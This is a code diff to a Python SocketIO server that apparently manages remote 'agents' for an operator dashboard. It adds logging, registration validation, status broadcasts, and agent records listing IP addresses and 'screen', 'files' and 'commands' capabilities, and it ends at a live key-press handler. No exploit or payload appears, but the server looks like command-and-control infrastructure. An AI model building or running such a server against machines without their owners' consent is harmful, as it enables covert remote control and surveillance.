@@ -2880,11 +2880,12 @@ def handle_disconnect():
 @socketio.on('operator_connect')
 def handle_operator_connect():
     """When a web dashboard connects."""
+    print(f"Operator dashboard connecting with SID: {request.sid}")
     join_room('operators')
-    print(f"Operator dashboard connected. Sending {len(AGENTS_DATA)} agents to new operator.")
+    print(f"Operator joined 'operators' room. Sending {len(AGENTS_DATA)} agents to new operator.")
     print(f"Current agents: {list(AGENTS_DATA.keys())}")
     emit('agent_list_update', AGENTS_DATA) # Send current agent list to the new operator
-    print("Agent list sent to operator.")
+    print(f"Agent list sent to operator {request.sid}")
 
 def _emit_agent_config(agent_id: str):
     return
@@ -2994,6 +2995,15 @@ def handle_ping(data):
     if agent_id in AGENTS_DATA:
         AGENTS_DATA[agent_id]['last_seen'] = datetime.datetime.utcnow().isoformat() + 'Z'
         AGENTS_DATA[agent_id]['uptime'] = uptime
+        
+        # Periodically update operators with agent status (every 10 pings to avoid spam)
+        if not hasattr(handle_ping, 'ping_count'):
+            handle_ping.ping_count = {}
+        handle_ping.ping_count[agent_id] = handle_ping.ping_count.get(agent_id, 0) + 1
+        
+        if handle_ping.ping_count[agent_id] % 10 == 0:
+            print(f"Updating operators with agent {agent_id} status after {handle_ping.ping_count[agent_id]} pings")
+            emit('agent_list_update', AGENTS_DATA, room='operators', broadcast=True)
     
     # Send pong response
     emit('pong', {
@@ -3007,42 +3017,75 @@ def handle_ping(data):
 @socketio.on('agent_register')
 def handle_agent_register(data):
     """Handle agent registration"""
-    agent_id = data.get('agent_id')
-    platform = data.get('platform', 'unknown')
-    python_version = data.get('python_version', 'unknown')
-    timestamp = data.get('timestamp')
-    
-    if not agent_id:
-        emit('registration_error', {'message': 'Agent ID required'})
-        return
-    
-    # Add agent to data
-    AGENTS_DATA[agent_id] = {
-        'agent_id': agent_id,
-        'platform': platform,
-        'python_version': python_version,
-        'connected_at': datetime.datetime.utcnow().isoformat() + 'Z',
-        'last_seen': datetime.datetime.utcnow().isoformat() + 'Z',
-        'status': 'online',
-        'sid': request.sid,
-        'uptime': 0
-    }
-    
-    print(f"Agent registered: {agent_id} ({platform})")
-    print(f"Current agents: {list(AGENTS_DATA.keys())}")
-    print(f"Emitting agent_list_update to operators room with {len(AGENTS_DATA)} agents")
-    
-    # Notify operators
-    emit('agent_list_update', AGENTS_DATA, room='operators', broadcast=True)
-    
-    # Send registration confirmation
-    emit('agent_registered', {
-        'agent_id': agent_id,
-        'status': 'success',
-        'message': 'Agent registered successfully'
-    })
-    
-    print(f"Agent registration complete for {agent_id}")
+    try:
+        if not data or not isinstance(data, dict):
+            print(f"Invalid agent_register data received: {data}")
+            emit('registration_error', {'message': 'Invalid registration data'})
+            return
+            
+        agent_id = data.get('agent_id')
+        platform = data.get('platform', 'unknown')
+        python_version = data.get('python_version', 'unknown')
+        timestamp = data.get('timestamp')
+        
+        if not agent_id:
+            emit('registration_error', {'message': 'Agent ID required'})
+            return
+        
+        # Add agent to data with all required fields for dashboard
+        AGENTS_DATA[agent_id] = {
+            'agent_id': agent_id,
+            'sid': request.sid,
+            'name': f'Agent-{agent_id}',
+            'platform': platform,
+            'python_version': python_version,
+            'ip': request.environ.get('REMOTE_ADDR', '0.0.0.0'),
+            'connected_at': datetime.datetime.utcnow().isoformat() + 'Z',
+            'last_seen': datetime.datetime.utcnow().isoformat() + 'Z',
+            'status': 'online',
+            'capabilities': ['screen', 'files', 'commands'],
+            'cpu_usage': 0,
+            'memory_usage': 0,
+            'network_usage': 0,
+            'system_info': {
+                'platform': platform,
+                'python_version': python_version
+            },
+            'uptime': 0
+        }
+        
+        print(f"Agent registered: {agent_id} ({platform})")
+        print(f"Current agents: {list(AGENTS_DATA.keys())}")
+        print(f"Emitting agent_list_update to operators room with {len(AGENTS_DATA)} agents")
+        
+        # Notify operators
+        print(f"Broadcasting agent_list_update to operators room with agent data: {list(AGENTS_DATA.keys())}")
+        emit('agent_list_update', AGENTS_DATA, room='operators', broadcast=True)
+        
+        # Log activity for operators
+        emit('activity_update', {
+            'id': f'act_{int(time.time())}',
+            'type': 'connection',
+            'action': 'Agent Connected',
+            'details': f'Agent {agent_id} successfully registered',
+            'agent_id': agent_id,
+            'agent_name': AGENTS_DATA[agent_id]["name"],
+            'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
+            'status': 'success'
+        }, room='operators', broadcast=True)
+        
+        # Send registration confirmation
+        emit('agent_registered', {
+            'agent_id': agent_id,
+            'status': 'success',
+            'message': 'Agent registered successfully'
+        })
+        
+        print(f"Agent registration complete for {agent_id}")
+        
+    except Exception as e:
+        print(f"Error handling agent_register: {e}")
+        emit('registration_error', {'message': 'Registration failed due to server error'})
 
 @socketio.on('live_key_press')
 def handle_live_key_press(data):
